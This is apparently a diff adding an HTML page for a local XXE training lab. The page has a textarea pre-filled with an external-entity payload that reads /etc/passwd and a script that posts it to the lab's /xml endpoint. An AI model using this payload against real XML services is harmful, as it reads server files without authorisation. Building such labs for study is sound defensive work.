@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XXE Vulnerable App</title>
+</head>
+<body>
+    <h1>XXE lab one file xxe attack -(gain access local files in attacker system)</h1>
+    <p>XXE Test Interface</p>
+
+    <textarea id="xmlInput" rows="12" cols="80">
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+    </textarea>
+
+    <br><br>
+    <button onclick="sendXML()">Send XML</button>
+
+    <pre id="output" style="width: 700px; background-color: red; overflow-x: scroll;"></pre>
+
+    <script>
+        function sendXML() {
+            fetch("/xml", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/xml"
+                },
+                body: document.getElementById("xmlInput").value
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById("output").textContent =
+                    JSON.stringify(data, null, 2);
+            });
+        }
+    </script>
+</body>
+</html>
